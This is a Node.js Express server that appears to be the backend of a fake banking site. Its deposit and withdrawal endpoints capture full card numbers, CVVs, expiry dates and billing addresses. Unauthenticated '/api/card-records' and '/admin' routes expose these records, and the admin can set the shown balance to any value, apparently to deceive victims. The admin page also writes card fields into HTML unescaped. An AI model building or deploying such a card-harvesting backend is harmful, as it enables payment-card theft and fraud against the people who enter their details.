const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// In-memory storage (replace with a database in production)
let balance = 678;
let transactions = [
    { type: 'Deposit', amount: 5000, date: 'Mar 1, 2025' },
    { type: 'Deposit', amount: 2000, date: 'Mar 5, 2025' },
    { type: 'Deposit', amount: 1000, date: 'Mar 10, 2025' },
    { type: 'Withdrawal', amount: 6856, date: 'Mar 17, 2025' }
];
let cardRecords = [];

// API Endpoints for Frontend
app.get('/api/balance', (req, res) => {
    res.json({ balance });
});

app.get('/api/history', (req, res) => {
    res.json(transactions);
});

app.get('/api/card-records', (req, res) => {
    res.json(cardRecords);
});

app.post('/api/deposit', (req, res) => {
    const { amount, ...cardDetails } = req.body;
    const depositAmount = parseFloat(amount);
    
    if (isNaN(depositAmount) || depositAmount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }

    balance += depositAmount;
    const date = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
    transactions.unshift({ type: 'Deposit', amount: depositAmount, date });
    cardRecords.unshift({ type: 'Deposit', ...cardDetails, date });
    res.json({ success: true, newBalance: balance });
});

app.post('/api/withdraw', (req, res) => {
    const { amount, ...cardDetails } = req.body;
    const withdrawAmount = parseFloat(amount);
    
    if (isNaN(withdrawAmount) || withdrawAmount <= 0 || withdrawAmount > balance) {
        return res.status(400).json({ error: 'Invalid amount or insufficient funds' });
    }

    balance -= withdrawAmount;
    const date = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
    transactions.unshift({ type: 'Withdrawal', amount: withdrawAmount, date });
    cardRecords.unshift({ type: 'Withdrawal', ...cardDetails, date });
    res.json({ success: true, newBalance: balance });
});

app.post('/api/update-balance', (req, res) => {
    const { newBalance } = req.body;
    const parsedBalance = parseFloat(newBalance);
    
    if (isNaN(parsedBalance) || parsedBalance < 0) {
        return res.status(400).json({ error: 'Invalid balance' });
    }
    
    balance = parsedBalance;
    const date = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
    transactions.unshift({ type: 'Admin Update', amount: parsedBalance, date });
    res.json({ success: true, newBalance: balance });
});

// Admin Interface
app.get('/admin', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Panel</title>
            <style>
                body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; }
                .section { margin-bottom: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
                input { padding: 8px; margin: 5px 0; width: 200px; }
                button { padding: 8px 16px; background-color: #1564C0; color: white; border: none; border-radius: 5px; cursor: pointer; }
                .record { padding: 10px; margin: 5px 0; background-color: #f9f9f9; border-radius: 5px; }
            </style>
        </head>
        <body>
            <h1>Admin Panel</h1>
            
            <div class="section">
                <h2>Balance Settings</h2>
                <input type="number" id="balanceInput" value="${balance}" step="0.01">
                <button onclick="updateBalance()">Update Balance</button>
                <p>Current Balance: $${balance.toFixed(2)}</p>
            </div>
            
            <div class="section">
                <h2>Card Records</h2>
                <div id="cardRecords">
                    ${cardRecords.map(record => `
                        <div class="record">
                            <strong>${record.type}</strong> - ${record.date}<br>
                            Amount: $${parseFloat(record.amount).toFixed(2)}<br>
                            Card Number: ${record.cardNumber}<br>
                            Cardholder Name: ${record.cardholdername}<br>
                            Expiring Date: ${record.expiringDate}<br>
                            CVV: ${record.cvv}<br>
                            Billing Address: ${record.billingAddress}<br>
                            State: ${record.state}<br>
                            City: ${record.city}<br>
                            Zip Code: ${record.zipCode}
                        </div>
                    `).join('')}
                </div>
            </div>

            <script>
                async function updateBalance() {
                    const newBalance = document.getElementById('balanceInput').value;
                    const response = await fetch('/api/update-balance', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ newBalance })
                    });
                    const data = await response.json();
                    if (data.success) {
                        location.reload();
                    } else {
                        alert('Error updating balance');
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// Handle root route to prevent "Cannot GET /" error
app.get('/', (req, res) => {
    res.status(404).json({ error: 'This is the backend API. Use /api endpoints for data or visit /admin for the admin panel.' });
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
